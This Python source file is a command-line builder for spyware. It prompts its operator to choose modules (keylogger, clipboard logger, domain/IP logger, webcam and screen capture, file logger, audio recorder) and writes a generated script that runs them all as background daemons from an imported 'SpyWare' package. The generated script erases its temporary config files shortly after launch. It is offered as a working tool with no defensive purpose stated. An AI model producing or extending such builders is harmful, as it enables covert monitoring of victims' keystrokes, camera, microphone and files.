#!/usr/bin/env python3
from colorama import Fore, Style, init
import sys

init(autoreset=True)


def option(prompt):
    allowed_true = ["yes", "y", "1"]
    allowed_false = ["no", "n", "0"]

    while True:
        user_input = input(f"{Fore.WHITE}{Style.BRIGHT}{prompt}").strip().lower()
        if user_input in allowed_true:
            return True
        elif user_input in allowed_false:
            return False
        else:
            print(f"{Fore.RED}{Style.BRIGHT}Invalid input. Please enter 'yes', 'no', 'y', 'n', '1', or '0'.")


def main(output_file):
    print(f"{Fore.GREEN}{Style.BRIGHT}Generating SpyWare...")
    global include_KeyLogger, include_ClipboardLogger, include_DomainsLogger
    global include_WebcamSpy, include_ScreenSpy, include_FilesLogger, include_AudioRecorder

    include_KeyLogger = option("Include KeyLogger?: ")
    include_ClipboardLogger = option("Include ClipboardLogger?: ")
    include_DomainsLogger = option("Include Domains/IP Logger?: ")
    include_WebcamSpy = option("Include Webcam Spy?: ")
    include_ScreenSpy = option("Include Screen Spy?: ")
    include_FilesLogger = option("Include File Logger?: ")
    include_AudioRecorder = option("Include Audio Recorder?: ")

    set_configs()
    generate_code(output_file)
    print(f"{Fore.GREEN}{Style.BRIGHT}SpyWare code generated and saved to: {output_file}")


def set_configs():
    global keylogger_conf, clipboard_conf, domains_conf, webcam_conf, screen_conf, files_conf, audio_conf
    print(f"{Fore.GREEN}{Style.BRIGHT}Setting custom configurations... ")

    if include_KeyLogger:
        print(f"{Fore.CYAN}KeyLogger Configuration:")
        filename = input("Filename [default: keySpy.txt]: ") or "keySpy.txt"
        event_press = input("Log key press events? (0/1) [default: 0]: ") or "0"
        event_release = input("Log key release events? (0/1) [default: 0]: ") or "0"
        hot_keys = input("Log hotkeys? (0/1) [default: 1]: ") or "1"
        event_time = input("Log event timestamps? (0/1) [default: 1]: ") or "1"

        keylogger_conf = f"""[SAVE]
        filename = {filename}
        event_press = {event_press}
        event_release = {event_release}
        hot_keys = {hot_keys}
        event_time = {event_time}

        [TIME]
        """

    if include_ClipboardLogger:
        print(f"{Fore.CYAN}Clipboard Logger Configuration:")
        filename = input("Filename [default: clipboard.txt]: ") or "clipboard.txt"
        check_interval = input("Check interval (seconds) [default: 11]: ") or "11"

        clipboard_conf = f"""[SAVE]
        filename = {filename}

        [TIME]
        check_internval = {check_interval}
        """

    if include_DomainsLogger:
        print(f"{Fore.CYAN}Domains Logger Configuration:")
        filename = input("Filename [default: domains.txt]: ") or "domains.txt"
        interval_dns = input("DNS check interval [default: 60]: ") or "60"
        interval_appdata = input("AppData check interval [default: 86400]: ") or "86400"
        interval_reading_file = input("File reading interval [default: 0.5]: ") or "0.5"
        interval_domain = input("Domain check interval [default: 0.05]: ") or "0.05"

        domains_conf = f"""[SAVE]
        filename = {filename}

        [TIME]
        interval_dns = {interval_dns}
        interval_appdata = {interval_appdata}
        interval_reading_file = {interval_reading_file}
        interval_domain = {interval_domain}
        """

    if include_WebcamSpy:
        print(f"{Fore.CYAN}Webcam Spy Configuration:")
        filename = input("Filename pattern [default: webcam*.png]: ") or "webcam*.png"
        dirname = input("Save directory [default: pictures]: ") or "pictures"
        picture_interval = input("Picture interval (seconds) [default: 3600]: ") or "3600"

        webcam_conf = f"""[SAVE]
        filename = {filename}
        dirname = {dirname}

        [TIME]
        picture_interval = {picture_interval}
        """

    if include_ScreenSpy:
        print(f"{Fore.CYAN}Screen Spy Configuration:")
        filename = input("Filename pattern [default: screenshot*.png]: ") or "screenshot*.png"
        dirname = input("Save directory [default: screenshots]: ") or "screenshots"
        screenshot_interval = input("Screenshot interval (seconds) [default: 3600]: ") or "3600"

        screen_conf = f"""[SAVE]
        filename = {filename}
        dirname = {dirname}

        [TIME]
        screenshot_interval = {screenshot_interval}
        """

    if include_FilesLogger:
        print(f"{Fore.CYAN}Files Logger Configuration:")
        filename = input("Filename [default: files.csv]: ") or "files.csv"
        file_interval = input("File interval [default: 0.1]: ") or "0.1"
        directory_interval = input("Directory interval [default: 1]: ") or "1"
        scan_interval = input("Full scan interval (seconds) [default: 86400]: ") or "86400"

        files_conf = f"""[SAVE]
        filename = {filename}

        [TIME]
        file_interval = {file_interval}
        directory_interval = {directory_interval}
        scan_interval = {scan_interval}
        """

    if include_AudioRecorder:
        print(f"{Fore.CYAN}Audio Recorder Configuration:")
        filename = input("Filename pattern [default: record*.wav]: ") or "record*.wav"
        dirname = input("Save directory [default: records]: ") or "records"
        interval = input("Recording interval (seconds) [default: 3590]: ") or "3590"
        record_time = input("Each recording length (seconds) [default: 10]: ") or "10"

        audio_conf = f"""[SAVE]
        filename = {filename}
        dirname = {dirname}

        [TIME]
        interval = {interval}
        record_time = {record_time}
        """


def generate_code(output_filename):
    with open(output_filename, "w") as f:
        f.write("import tempfile\nimport os\nimport threading\nimport time")

    if include_KeyLogger:
        with open(output_filename, "a") as f:
            f.write("\nfrom SpyWare.KeyLogger import Daemon as keyDaemon, keyConfig")

    if include_ClipboardLogger:
        with open(output_filename, "a") as f:
            f.write("\nfrom SpyWare.ClipboardLogger import Daemon as clipDaemon, clipboardConfig")

    if include_DomainsLogger:
        with open(output_filename, "a") as f:
            f.write("\nfrom SpyWare.DomainsLogger import Daemon as domainDaemon, domainsConfig")

    if include_WebcamSpy:
        with open(output_filename, "a") as f:
            f.write("\nfrom SpyWare.WebcamLogger import Daemon as camDaemon, webcamConfig")

    if include_ScreenSpy:
        with open(output_filename, "a") as f:
            f.write("\nfrom SpyWare.ScreenLogger import Daemon as screenDaemon, screenConfig")

    if include_FilesLogger:
        with open(output_filename, "a") as f:
            f.write("\nfrom SpyWare.FilesLogger import Daemon as filesDaemon, filesConfig")

    if include_AudioRecorder:
        with open(output_filename, "a") as f:
            f.write("\nfrom SpyWare.AudioLogger import Daemon as audioDaemon, audioConfig")

    with open(output_filename, "a") as f:
        f.write("""
def write_temp_config(name, content):
    temp_path = os.path.join(tempfile.gettempdir(), name)
    with open(temp_path, "w") as f:
        f.write(content.strip())
    return temp_path

def delayed_cleanup(paths, delay=10):
    time.sleep(delay)
    for path in paths:
        try:
            if os.path.exists(path):
                os.remove(path)
        except Exception as e:
            print(f"Cleanup failed for {path}: {e}")

def run_all():
    threads = []
    config_paths = []
""")
        if include_KeyLogger:
            f.write(f"""
    keylogger_conf = \"\"\"{keylogger_conf.strip()}\"\"\"
    key_conf_path = write_temp_config("keySpy.conf", keylogger_conf)
    keyConfig(key_conf_path)
    config_paths.append(key_conf_path)
    threads.append(threading.Thread(target=keyDaemon().run_for_ever))""")

        if include_ClipboardLogger:
            f.write(f"""
    clipboard_conf = \"\"\"{clipboard_conf.strip()}\"\"\"
    clip_conf_path = write_temp_config("clipboard.conf", clipboard_conf)
    clipboardConfig(clip_conf_path)
    config_paths.append(clip_conf_path)
    threads.append(threading.Thread(target=clipDaemon().run_for_ever))""")

        if include_DomainsLogger:
            f.write(f"""
    domains_conf = \"\"\"{domains_conf.strip()}\"\"\"
    domains_conf_path = write_temp_config("domains.conf", domains_conf)
    domainsConfig(domains_conf_path)
    config_paths.append(domains_conf_path)
    def get_data():
        domainDaemon().run_AppData()
        domainDaemon().run_CacheDns()
    threads.append(threading.Thread(target=get_data))""")

        if include_WebcamSpy:
            f.write(f"""
    webcam_conf = \"\"\"{webcam_conf.strip()}\"\"\"
    cam_conf_path = write_temp_config("webcam.conf", webcam_conf)
    webcamConfig(cam_conf_path)
    config_paths.append(cam_conf_path)
    threads.append(threading.Thread(target=camDaemon().run_for_ever))""")

        if include_ScreenSpy:
            f.write(f"""
    screen_conf = \"\"\"{screen_conf.strip()}\"\"\"
    screen_conf_path = write_temp_config("screen.conf", screen_conf)
    screenConfig(screen_conf_path)
    config_paths.append(screen_conf_path)
    threads.append(threading.Thread(target=screenDaemon().run_for_ever))""")

        if include_FilesLogger:
            f.write(f"""
    files_conf = \"\"\"{files_conf.strip()}\"\"\"
    files_conf_path = write_temp_config("files.conf", files_conf)
    filesConfig(files_conf_path)
    config_paths.append(files_conf_path)
    threads.append(threading.Thread(target=filesDaemon().run_for_ever))""")

        if include_AudioRecorder:
            f.write(f"""
    audio_conf = \"\"\"{audio_conf.strip()}\"\"\"
    audio_conf_path = write_temp_config("audio.conf", audio_conf)
    audioConfig(audio_conf_path)
    config_paths.append(audio_conf_path)
    def get_audio_forever():
        while True:
            audioDaemon().run_for_ever()
    threads.append(threading.Thread(target=get_audio_forever))""")

        f.write("""
    cleanup_thread = threading.Thread(target=delayed_cleanup, args=(config_paths,))
    cleanup_thread.daemon = True
    cleanup_thread.start()

    for thread in threads:
        thread.daemon = True
        thread.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("Exiting...")

run_all()
""")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        output_filename = sys.argv[1]
    else:
        output_filename = input(f"{Fore.YELLOW}Enter output filename: ").strip()
        if not output_filename:
            print(f"{Fore.RED}No output filename provided. Exiting.")
            sys.exit(1)

    main(output_filename)
